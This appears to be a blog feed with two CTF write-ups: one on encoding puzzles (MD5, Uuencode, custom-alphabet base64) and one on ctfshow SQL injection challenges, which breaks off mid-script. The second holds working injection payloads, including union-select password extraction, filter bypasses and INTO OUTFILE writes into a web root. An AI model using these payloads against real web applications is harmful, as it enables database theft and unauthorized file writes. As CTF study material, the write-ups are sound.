    <link href="/2022/04/28/blog0017-NSSCTF-%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81-wp/"/>
    <url>/2022/04/28/blog0017-NSSCTF-%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81-wp/</url>
    
    <content type="html"><![CDATA[<p>编码这种东西太多了，这次其实主要是学习一下<code>base</code>编码的一些东西</p><span id="more"></span><h4 id="swpuctf-2021crypto7md5">[SWPUCTF 2021]crypto7（md5）</h4><p>编码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">69f</span>7906323b4f7d1e4e972acf4abfbfc<br></code></pre></td></tr></table></figure><p>全部为16进制的数字，但是显然有几个不是在ASCII范围内，应该不是16进制转换。</p><p>观察发现长度为32，意味着可能是MD5编码，尝试使用MD5在线解密。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://www.cmd5.com/<br></code></pre></td></tr></table></figure><p>得到结果。</p><h4 id="swpuctf-2021crypto8ciphey">[SWPUCTF 2021]crypto8（ciphey）</h4><p>编码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">73E-30</span>U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`<br></code></pre></td></tr></table></figure><p>答案是<code>Uuencode</code>，不过我们可以直接工具一把子过了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m ciphey -t &#x27;73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`&#x27;<br></code></pre></td></tr></table></figure><p>直接拿到答案</p><h4 id="afctf-2018basebase循环编码">[AFCTF 2018]BASE（base循环编码）</h4><p>这道题给了一个很大的文件，我拿出第一行，发现反复在<code>base64/32/16</code>中解码，这显然直接求助于Python脚本</p><p>我最开始写了一个基于异常处理的，后来看到Xenny大佬的脚本，觉得很好，这里附上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re,base64<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag_encode.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>    data = fin.read()<br><br>b16_dict = <span class="hljs-string">r&quot;^[A-F0-9=]*$&quot;</span><br>b32_dict = <span class="hljs-string">r&quot;^[A-Z2-7=]*$&quot;</span><br>b64_dict = <span class="hljs-string">r&quot;^[A-Za-z0-9/+=]*$&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = data.decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-built_in">print</span>(t)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> re.match(b16_dict,t):<br>        data = base64.b16decode(t)<br>    <span class="hljs-keyword">elif</span> re.match(b32_dict,t):<br>        data = base64.b32decode(t)<br>    <span class="hljs-keyword">elif</span> re.match(b64_dict,t):<br>        data = base64.b64decode(t)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;寄&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h4 id="bjdctf-2020basebase64编码原理">[BJDCTF 2020]base??（base64编码原理）</h4><p>这道题给了一个字典，如果了解<code>base64</code>的编码原则，大概可以猜到，这段密文是基于这个字典，按照<code>base64</code>的原则编码的。</p><p>附上我的python 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re,base64<br><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-number">0</span>: <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-number">5</span>: <span class="hljs-string">&#x27;O&#x27;</span>,<br>        <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">7</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-number">9</span>: <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">10</span>: <span class="hljs-string">&#x27;z&#x27;</span>,<br>        <span class="hljs-number">11</span>: <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">12</span>: <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">13</span>: <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">14</span>: <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-number">15</span>: <span class="hljs-string">&#x27;E&#x27;</span>, <br>        <span class="hljs-number">16</span>: <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-number">18</span>: <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <br>        <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-number">24</span>: <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <br>        <span class="hljs-number">26</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">27</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">28</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">29</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">30</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <br>        <span class="hljs-number">31</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-number">33</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">34</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-number">35</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <br>        <span class="hljs-number">36</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">37</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-number">38</span>: <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-number">39</span>: <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-number">40</span>: <span class="hljs-string">&#x27;Y&#x27;</span>, <br>        <span class="hljs-number">41</span>: <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-number">42</span>: <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">44</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">45</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <br>        <span class="hljs-number">46</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">47</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-number">48</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-number">49</span>: <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-number">50</span>: <span class="hljs-string">&#x27;S&#x27;</span>,<br>        <span class="hljs-number">51</span>: <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-number">52</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">54</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">55</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <br>        <span class="hljs-number">56</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">57</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">58</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-number">59</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-number">60</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <br>        <span class="hljs-number">61</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">62</span>: <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-number">63</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">64</span>: <span class="hljs-string">&#x27;=&#x27;</span><br>        &#125;<br><br>inv_dict = &#123;v : k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>.items()&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_bit_stream</span>(<span class="hljs-params">c</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>        one = <span class="hljs-built_in">bin</span>(inv_dict[i]).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        one = (<span class="hljs-number">6</span>-<span class="hljs-built_in">len</span>(one))*<span class="hljs-string">&#x27;0&#x27;</span> + one<br>        res += one<br>    <span class="hljs-keyword">return</span> res    <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_ascii_stream</span>(<span class="hljs-params">s</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">8</span>):<br>        num = <span class="hljs-built_in">int</span>(s[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)<br>        res += <span class="hljs-built_in">chr</span>(num)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = <span class="hljs-string">&quot;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&quot;</span><br>    <span class="hljs-built_in">print</span>(to_ascii_stream(to_bit_stream(cipher)))<br></code></pre></td></tr></table></figure><h4 id="安洵杯-2019justbase">[安洵杯 2019]JustBase</h4><p>这道题其实猜到用键盘上的<code>!@#$%^&amp;*()</code>来替代<code>123456789</code></p><p>但是顺序没说，如果直接尝试爆破的话，结果会<span class="math inline">\(10!\)</span>种，而且由于<code>base64</code>的容错率比较高，其实最后爆破出来还是要在文本中进一步的筛选（你可以根据部分结果猜出前面那段英文的正确形式，然后全局查找）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_string</span>(<span class="hljs-params">l</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(l) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> [l]<br>    <span class="hljs-keyword">else</span>:<br>        res = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l:<br>            tmp = get_string(l.replace(i,<span class="hljs-string">&#x27;&#x27;</span>))<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>                tmp[j] = i + tmp[j]<br>            res += tmp<br>        <span class="hljs-comment"># print(res)        </span><br>        <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_answer</span>(<span class="hljs-params"><span class="hljs-built_in">dict</span></span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;base.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fin:<br>        data = fin.read()<br>    <br>    tmp = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>            tmp += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>.index(i))<br>        <span class="hljs-keyword">else</span>:<br>            tmp += i<br>    <span class="hljs-keyword">try</span>:<br>        res = base64.b64decode(tmp.encode()).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(res)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span><br><br>l = <span class="hljs-string">&quot;@#!)$(%^*&amp;&quot;</span><br><br><span class="hljs-built_in">dict</span> = (get_string(l))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>:<br>    get_answer(i)<br><br><span class="hljs-comment"># print(len(get_string(l)))</span><br></code></pre></td></tr></table></figure><p>补充：网上的<code>WP</code>都说可以观察，其实也是正确的，因为你稍微爆破一下会发现这是一段英文，根据<code>base64</code>明文和密文的长度对比（<span class="math inline">\(3\times8 = 4\times6\)</span>），你可以截断部分获取你想要的字符而不影响解码，这样可以大大减少爆破的规模。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>Crypto</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>NSS</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-sql注入-wp</title>
    <link href="/2022/04/17/blog0015-ctfshow-sql%E6%B3%A8%E5%85%A5-wp/"/>
    <url>/2022/04/17/blog0015-ctfshow-sql%E6%B3%A8%E5%85%A5-wp/</url>
    
    <content type="html"><![CDATA[<p>终于，在摸鱼混了半年CTF之后，开始向梦开始的地方发起冲击了！</p><p>参考链接：</p><p>https://www.xiinnn.com/article/6205ef9.html</p><span id="more"></span><h3 id="web171-3联合注入">web17[1-3]—联合注入</h3><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>语句查找指定ID用户<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="hljs-string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;<br></code></pre></td></tr></table></figure><p>这三道题都是联合注入，套路基本差不多，爆库<span class="math inline">\(\rightarrow\)</span>爆表<span class="math inline">\(\rightarrow\)</span>爆列<span class="math inline">\(\rightarrow\)</span>爆数据</p><p>过滤也是非常简单的过滤，没什么特别需要说明的地方。</p><h3 id="web174replace绕过">web174—replace绕过</h3><p>SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#拼接<span class="hljs-keyword">sql</span>语句查找指定ID用户<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="hljs-string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;<br></code></pre></td></tr></table></figure><p>过滤逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里我们可以利用SQL自带的<code>replace</code>函数来实现结果的过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select &#x27;</span>a<span class="hljs-string">&#x27;, replace(replace(replace(replace(replace(replace(replace(replace(replace(replace((select group_concat(0x5c,password) from ctfshow_web.ctfshow_user4),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span>numa<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numb<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numc<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numd<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>nume<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numf<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numg<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numh<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numi<span class="hljs-operator">*</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-operator">*</span>numj<span class="hljs-operator">*</span><span class="hljs-string">&#x27;); -- -</span><br></code></pre></td></tr></table></figure><p>这里附上Python的代码生成模块和解码模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_str</span>():</span><br>    s = <span class="hljs-string">&quot;replace((select group_concat(0x5c,password) from ctfshow_web.ctfshow_user4),&#x27;0&#x27;,&#x27;*numa*&#x27;)&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        s = <span class="hljs-string">&quot;replace(&quot;</span> + s + <span class="hljs-string">&quot;,&#x27;&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;&#x27;, &#x27;*num&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i) + <span class="hljs-string">&quot;*&#x27;)&quot;</span><br>    <span class="hljs-built_in">print</span>(s) <br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_str</span>():</span><br>    s = <span class="hljs-string">&quot;ctfshow&#123;*numj*b*numg*de*numj**numh**numa*-*numf*d*numb*c-*nume*efd-*numj**numa*d*numd*-f*numj**numj**numb**numb*d*numf**numh*baea&#125;&quot;</span><br>    arr_s = s.split(<span class="hljs-string">&#x27;*&#x27;</span>)<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr_s:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;num&#x27;</span> <span class="hljs-keyword">in</span> i):<br>            i = i.replace(<span class="hljs-string">&quot;num&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>            i = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            res += i<br>        <span class="hljs-keyword">else</span>:<br>            res += i<br>    <span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># encode_str()</span><br>    decode_str()<br></code></pre></td></tr></table></figure><h3 id="web175outfile重定向">web175—outfile重定向</h3><p>SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="hljs-string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;<br></code></pre></td></tr></table></figure><p>过滤逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这基本上就是不打算让我们在前端页面上可到结果了，于是考虑将查询结果重定向到文件中，于是我们使用<code>outfile</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=0 union select username, password from ctfshow_user5 where username=&#x27;</span>flag<span class="hljs-string">&#x27; into outfile &#x27;</span><span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>www<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span><span class="hljs-number">2.</span>txt<span class="hljs-string">&#x27;; -- -</span><br></code></pre></td></tr></table></figure><h3 id="web176大小写">web176—大小写</h3><p>这里是过滤了<code>union</code>，<code>select</code></p><p>但是我们知道，<code>mysql</code>对于关键字是不区分大小写的，对于数据库名和表名是要根据操作系统来判断，<code>windows</code>是不区分的，但是对于<code>linux</code>是大小写敏感的。类似的原理还有文件上传时，文件的后缀名的大小写绕过。</p><p>附上相关资料的连接:</p><p>http://c.biancheng.net/view/7178.html</p><p>这道题本身还是比较简单的，直接：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union sElect 1,2,password from ctfshow_web.ctfshow_user</span><br></code></pre></td></tr></table></figure><p>（有意思的是，这道题直接万能钥匙也能一把梭，忘记过滤<code>OR</code>了）</p><h3 id="web177空格过滤">web177—空格过滤</h3><p>这里过滤了空格，在mysql中，我们有许多可以绕过空格的手段</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">\**\<br>%0a<br>%09<br>%0d<br>%0c<br></code></pre></td></tr></table></figure><p>当使用空格过滤时，我们要使用<code>#</code>，不要使用<code>-</code></p><h3 id="web178减号过滤">web178—减号过滤</h3><p>仍然可以用上一题的payload</p><h3 id="web180-2优先级拼接">web18[0-2]—优先级拼接</h3><p>这道题我们fuzz可以发现<code>--</code>和<code>#</code>都被过滤了，我们这次可以精巧地利用优先级构造语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;0&#x27; or username=&#x27;flag&#x27; and &#x27;1&#x27;=&#x27;1&#x27; limit 1;&quot;</span>;<br></code></pre></td></tr></table></figure><p>因此我们的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">params[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-string">&quot;0&#x27; or (username=&#x27;flag&#x27;) and &#x27;1&#x27;=&#x27;1&quot;</span>.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\x0c&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="web183布尔盲注">web183—布尔盲注</h3><p>先看SQL语句:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>waf也给了我们：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>返回的结果是判断搜索到的条数，这也给了我们布尔盲注的机会。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 